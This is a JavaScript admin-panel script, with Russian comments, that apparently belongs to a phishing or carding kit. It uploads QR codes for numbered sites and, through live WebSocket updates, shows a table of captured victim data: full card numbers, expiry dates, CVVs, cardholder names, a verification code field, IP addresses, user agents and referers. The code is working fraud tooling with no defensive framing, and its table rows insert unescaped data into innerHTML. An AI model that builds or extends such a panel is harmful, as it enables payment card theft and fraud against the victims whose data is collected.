// Инициализация элементов
const qrModal = document.getElementById('qrModal');
const qrBtn = document.getElementById('qrBtn');
const closeBtn = document.querySelector('.close');
const refreshBtn = document.getElementById('refreshBtn');
const tableBody = document.getElementById('tableBody');

// Обработчики событий
qrBtn.addEventListener('click', () => {
    qrModal.style.display = 'block';
    refreshQRCodes();
});

closeBtn.addEventListener('click', () => {
    qrModal.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === qrModal) {
        qrModal.style.display = 'none';
    }
});

refreshBtn.addEventListener('click', refreshData);

// Функция обновления QR-кодов
function refreshQRCodes() {
    const qrImages = document.querySelectorAll('.qr-section img');
    qrImages.forEach((img, index) => {
        img.src = `/qr/${index + 1}?t=${new Date().getTime()}`;
    });
}

// Функция загрузки нового QR-кода
async function uploadQR(siteNumber) {
    const fileInput = document.getElementById(`qr${siteNumber}Upload`);
    const file = fileInput.files[0];
    
    if (!file) {
        showNotification('Пожалуйста, выберите файл', 'error');
        return;
    }

    const formData = new FormData();
    formData.append('qrCode', file);
    formData.append('siteNumber', siteNumber);

    try {
        const response = await fetch('/admin/upload-qr', {
            method: 'POST',
            body: formData
        });

        const data = await response.json();
        
        if (response.ok) {
            showNotification('QR-код успешно загружен', 'success');
            refreshQRCodes();
        } else {
            showNotification(data.error || 'Ошибка загрузки QR-кода', 'error');
        }
    } catch (error) {
        showNotification('Ошибка при загрузке QR-кода', 'error');
        console.error('Error:', error);
    }
}

// Функция отображения уведомлений
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 5000);
}

// Функция обновления данных таблицы
async function refreshData() {
    try {
        const response = await fetch('/api/data');
        const data = await response.json();
        
        tableBody.innerHTML = '';
        data.forEach(item => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${item.id}</td>
                <td>${item.cc_num}</td>
                <td>${item.exp}</td>
                <td>${item.cvv}</td>
                <td>${item.cardholder}</td>
                <td>${item.code || '-'}</td>
                <td>${item.site}</td>
                <td>${item.ip}</td>
                <td>${item.ua}</td>
                <td>${item.referer}</td>
            `;
            tableBody.appendChild(row);
        });
    } catch (error) {
        showNotification('Ошибка при обновлении данных', 'error');
        console.error('Error:', error);
    }
}

// Инициализация WebSocket
const socket = io();

socket.on('connect', () => {
    console.log('Connected to WebSocket server');
    showNotification('Подключено к серверу', 'success');
});

socket.on('newData', () => {
    refreshData();
    showNotification('Получены новые данные', 'info');
});

socket.on('error', (error) => {
    showNotification('Ошибка WebSocket соединения', 'error');
    console.error('WebSocket error:', error);
});

// Начальная загрузка данных
refreshData(); 